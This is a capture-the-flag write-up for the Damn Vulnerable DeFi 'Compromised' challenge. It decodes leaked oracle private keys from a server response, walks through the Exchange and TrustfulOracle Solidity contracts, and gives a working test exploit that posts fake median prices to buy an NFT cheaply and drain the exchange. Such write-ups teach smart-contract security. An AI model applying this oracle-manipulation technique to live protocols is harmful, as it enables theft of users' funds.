@@ -1,0 +1,348 @@
+#+AUTHOR: Francesco Cannarozzo
+* Compromised
+** Statement
+   an exchange is selling expensive NFTs, fetching price via three trusted oracles.
+   Starting with minimal (0.1 ETH) funds, we are tasked with draining the pool.
+
+   Furthermore, we are provided with an alluring snippet:
+
+   #+BEGIN_SRC
+	 HTTP/2 200 OK
+   content-type: text/html
+   content-language: en
+   vary: Accept-Encoding
+   server: cloudflare
+
+   4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+   4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+
+   #+END_SRC
+** Snippet
+   the snippet seems to be comprised of two separate sets of hexadecimal numbers, each starting with
+   *4d 48*. in the snippet heading we also read *vary: Accept-Encoding*, so it's safe to assume these
+   are actually encoded.
+   
+   simply mapping the bytes to ASCII yelds unfamiliar strings:
+
+   #+BEGIN_SRC
+   MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+
+   MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+   #+END_SRC
+
+   these don't look like anything useful to us, so we're going to have to figure out which encoding
+   has been used.
+   It's easy to notice how the two strings have identical length of 44: being this a multiple of four,
+   we can try the very common BASE64 encoding, and passing the strings we receive
+
+   #+BEGIN_SRC
+  0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+
+  0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+   #+END_SRC
+
+   if we take the part after '0x', we can see how both strings are formed exactly by 64
+   hex characters.
+
+   _...Just like a private key._
+** Files
+*** Exchange.sol
+**** Code
+     #+BEGIN_SRC solidity
+     // SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+import "./TrustfulOracle.sol";
+import "../DamnValuableNFT.sol";
+
+/**
+ * @title Exchange
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract Exchange is ReentrancyGuard {
+
+    using Address for address payable;
+
+    DamnValuableNFT public immutable token;
+    TrustfulOracle public immutable oracle;
+
+    event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);
+    event TokenSold(address indexed seller, uint256 tokenId, uint256 price);
+
+    constructor(address oracleAddress) payable {
+        token = new DamnValuableNFT();
+        oracle = TrustfulOracle(oracleAddress);
+    }
+
+    function buyOne() external payable nonReentrant returns (uint256) {
+        uint256 amountPaidInWei = msg.value;
+        require(amountPaidInWei > 0, "Amount paid must be greater than zero");
+
+        // Price should be in [wei / NFT]
+        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
+        require(amountPaidInWei >= currentPriceInWei, "Amount paid is not enough");
+
+        uint256 tokenId = token.safeMint(msg.sender);
+        
+        payable(msg.sender).sendValue(amountPaidInWei - currentPriceInWei);
+
+        emit TokenBought(msg.sender, tokenId, currentPriceInWei);
+
+        return tokenId;
+    }
+
+    function sellOne(uint256 tokenId) external nonReentrant {
+        require(msg.sender == token.ownerOf(tokenId), "Seller must be the owner");
+        require(token.getApproved(tokenId) == address(this), "Seller must have approved transfer");
+
+        // Price should be in [wei / NFT]
+        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
+        require(address(this).balance >= currentPriceInWei, "Not enough ETH in balance");
+
+        token.transferFrom(msg.sender, address(this), tokenId);
+        token.burn(tokenId);
+        
+        payable(msg.sender).sendValue(currentPriceInWei);
+
+        emit TokenSold(msg.sender, tokenId, currentPriceInWei);
+    }
+
+    receive() external payable {}
+}
+
+     #+END_SRC
+**** Breakdown
+***** State
+      the contract is minimally stateful, only maintaining immutable references
+      to both the *DamnValuableNFT* token, and the *TrustfulOracle* oracle;
+      while the first will be instanced at contract creation, the second will be passed 
+      in the constructor.
+***** buyOne
+      function used to buy a *DamnValuableNFT* from the exchange.
+
+      value sent along with the call is recorded in *amountPaidInWei*, which is required to be
+      greater than zero: the current price for the token is then retrieved through *oracle*'s 
+      *getMedianPrice*: such price is required to be lower than *amountPaidInWei*.
+
+      then, the token is minted to *msg.sender*'s account, and any change is refunded.
+      Finally, the appropriate event is emitted, and uint *tokenId* is returned.
+
+***** sellOne
+      just as above, only for selling NFTs.
+
+      initial requirements for *msg.sender* to be the owner of *tokenId* token and for the approval
+      of such token for the exchange address are set;
+      
+      if they are met, price is once more fetched from oracles as above: after the NFT has been transferred
+      to the exchange and burned, corresponding value is sent back to *msg.sender*, and the appropriate
+      event emitted.
+*** TrustfulOracle.sol
+**** Code
+     #+BEGIN_SRC solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/access/AccessControlEnumerable.sol";
+
+/**
+ * @title TrustfulOracle
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ * @notice A price oracle with a number of trusted sources that individually report prices for symbols.
+ *         The oracle's price for a given symbol is the median price of the symbol over all sources.
+ */
+contract TrustfulOracle is AccessControlEnumerable {
+
+    bytes32 public constant TRUSTED_SOURCE_ROLE = keccak256("TRUSTED_SOURCE_ROLE");
+    bytes32 public constant INITIALIZER_ROLE = keccak256("INITIALIZER_ROLE");
+
+    // Source address => (symbol => price)
+    mapping(address => mapping (string => uint256)) private pricesBySource;
+
+    modifier onlyTrustedSource() {
+        require(hasRole(TRUSTED_SOURCE_ROLE, msg.sender));
+        _;
+    }
+
+    modifier onlyInitializer() {
+        require(hasRole(INITIALIZER_ROLE, msg.sender));
+        _;
+    }
+
+    event UpdatedPrice(
+        address indexed source,
+        string indexed symbol,
+        uint256 oldPrice,
+        uint256 newPrice
+    );
+
+    constructor(address[] memory sources, bool enableInitialization) {
+        require(sources.length > 0);
+        for(uint256 i = 0; i < sources.length; i++) {
+            _setupRole(TRUSTED_SOURCE_ROLE, sources[i]);
+        }
+
+        if (enableInitialization) {
+            _setupRole(INITIALIZER_ROLE, msg.sender);
+        }
+    }
+
+    // A handy utility allowing the deployer to setup initial prices (only once)
+    function setupInitialPrices(
+        address[] memory sources,
+        string[] memory symbols,
+        uint256[] memory prices
+    ) 
+        public
+        onlyInitializer
+    {
+        // Only allow one (symbol, price) per source
+        require(sources.length == symbols.length && symbols.length == prices.length);
+        for(uint256 i = 0; i < sources.length; i++) {
+            _setPrice(sources[i], symbols[i], prices[i]);
+        }
+        renounceRole(INITIALIZER_ROLE, msg.sender);
+    }
+
+    function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource {
+        _setPrice(msg.sender, symbol, newPrice);
+    }
+
+    function getMedianPrice(string calldata symbol) external view returns (uint256) {
+        return _computeMedianPrice(symbol);
+    }
+
+    function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory) {
+        uint256 numberOfSources = getNumberOfSources();
+        uint256[] memory prices = new uint256[](numberOfSources);
+
+        for (uint256 i = 0; i < numberOfSources; i++) {
+            address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);
+            prices[i] = getPriceBySource(symbol, source);
+        }
+
+        return prices;
+    }
+
+    function getPriceBySource(string memory symbol, address source) public view returns (uint256) {
+        return pricesBySource[source][symbol];
+    }
+
+    function getNumberOfSources() public view returns (uint256) {
+        return getRoleMemberCount(TRUSTED_SOURCE_ROLE);
+    }
+
+    function _setPrice(address source, string memory symbol, uint256 newPrice) private {
+        uint256 oldPrice = pricesBySource[source][symbol];
+        pricesBySource[source][symbol] = newPrice;
+        emit UpdatedPrice(source, symbol, oldPrice, newPrice);
+    }
+
+    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
+        uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));
+
+        // calculate median price
+        if (prices.length % 2 == 0) {
+            uint256 leftPrice = prices[(prices.length / 2) - 1];
+            uint256 rightPrice = prices[prices.length / 2];
+            return (leftPrice + rightPrice) / 2;
+        } else {
+            return prices[prices.length / 2];
+        }
+    }
+
+    function _sort(uint256[] memory arrayOfNumbers) private pure returns (uint256[] memory) {
+        for (uint256 i = 0; i < arrayOfNumbers.length; i++) {
+            for (uint256 j = i + 1; j < arrayOfNumbers.length; j++) {
+                if (arrayOfNumbers[i] > arrayOfNumbers[j]) {
+                    uint256 tmp = arrayOfNumbers[i];
+                    arrayOfNumbers[i] = arrayOfNumbers[j];
+                    arrayOfNumbers[j] = tmp;
+                }
+            }
+        }        
+        return arrayOfNumbers;
+    }
+}
+     #+END_SRC
+**** Breakdown
+***** State
+      save for constants, there's only one structure maintained by the contract, and a flashy one at that:
+      *pricesBySource* maps addresses onto a mapping of strings on to integers:
+      addresses represent trusted oracles, Symbols will be associated to tokens, and the integer represent price.
+
+      
+***** Constructor
+      as the contract inherits from *AccessControlEnumerable*,
+      we're trusting the contract's safety on proper assignation of such roles:
+      at contract deployment, we pass the constructor a *address[]* array /sources/
+      containing the addresses of trusted oracle, along with a *bool* /enableInitialization/.\
+
+      after all the addresses in /sources/ are assigned their role of *trusted source*,
+      if /enableInitialization/ is set to true msg.sender will be assigned as the *initializer*
+***** SetUpInitialPrices
+      To be called only once per exchange instance, the method is restricted to callers with
+      *inizializer* role.
+
+      three arrays are passed: /sources/, /symbols/, and /price/:
+      such arrays are then used to populate /pricesBySource/ through *_setPrice()*,
+      before the *initializer* role is removed from *msg.sender*.
+***** postPrice
+      public facade of *_setPrice()*, allows only *trusted source* role holders to call it.
+***** getMedianPrice
+      calls upon private method *_computeMedianPrice()*.
+***** getAllPricesForSymbol
+      given a token Symbol, returns an array containing all the different sources's prices
+      for such symbol.
+***** getNumberOfSources
+      gets number of sources :)
+***** _setPrice
+      given /source/, /symbol/ and /newPrice/, updates the corresponding *pricesBySource* entry.
+***** _computeMedianPrice
+      AFter sorting all provided prices for given /symbol/, calculates the median.
+***** _sort
+      sorts an array of integers :)
+** Exploit
+   We can actually exploit these contracts without even deploying our own.
+   once we have established the captured private keys to indeed belong to two of the oracle's trusted sources,
+   we can impersonate them, and manipulate the price as we want:
+
+   that way, we can buy low and sell high, draining the exchange's funds and completing the challenge.
+
+   #+BEGIN_SRC javascript
+       it('Exploit', async function () {        
+        keys = [
+            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
+            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+        ]
+        
+        wallet1 = new ethers.Wallet(keys[0], ethers.provider);
+        wallet2 = new ethers.Wallet(keys[1], ethers.provider);
+        expect(sources).to.contain(wallet1.address).and.to.contain(wallet2.address);
+        // we control two out of three oracles, and can thus affect the median price!
+        
+        // first, we set the price very low
+            await this.oracle.connect(wallet1).postPrice("DVNFT", 2);
+            await this.oracle.connect(wallet2).postPrice("DVNFT", 2);
+        // we then buy for cheap
+        await this.exchange.connect(attacker).buyOne({value: 2});
+        // now we raise the price
+        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.provider.getBalance(this.exchange.address));
+        await this.oracle.connect(wallet2).postPrice("DVNFT", ethers.provider.getBalance(this.exchange.address));
+
+        //and we sell for a high, high price
+         await this.nftToken.connect(attacker).approve(this.exchange.address, ethers.BigNumber.from(0));
+         await this.exchange.connect(attacker).sellOne(ethers.BigNumber.from(0));
+
+         //then we set the price back to normal
+         await this.oracle.connect(wallet1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+         await this.oracle.connect(wallet2).postPrice("DVNFT", INITIAL_NFT_PRICE);
+ 
+
+    });
+
+   #+END_SRC
